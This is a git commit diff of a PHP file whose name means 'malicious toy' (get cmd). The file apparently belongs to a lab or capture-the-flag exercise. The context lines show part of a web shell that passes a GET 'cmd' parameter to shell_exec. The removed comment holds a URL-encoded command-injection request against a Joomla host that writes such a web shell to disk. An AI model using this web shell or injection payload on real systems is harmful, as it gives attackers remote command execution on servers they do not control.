accfb147f0747ab8085ab49aaecb32edae9e7636
Leandro <43631792+bigolho16@users.noreply.github.com>
2022-06-09 15:03:20 -0400

    Update brinquedo_malicioso_get_cmd.php

--- brinquedo_malicioso_get_cmd.php
+++ brinquedo_malicioso_get_cmd.php
@@ -5,5 +5,3 @@ if (isset($_GET['cmd'])) {
 <?php
 }
 ?>
-
-<!-- http://10.10.94.70/joomla/_test/index.php?plot=;id;echo%20%22%3C?phpif%20(isset($_GET[%27cmd%27]))%20{?%3E%3Cpre%3E%20%3C?php%20print((shell_exec($_GET[%27cmd%27])));%20?%3E%20%3C/pre%3E%3C?php}?%3E%22%20%3E%20brinquedo.php
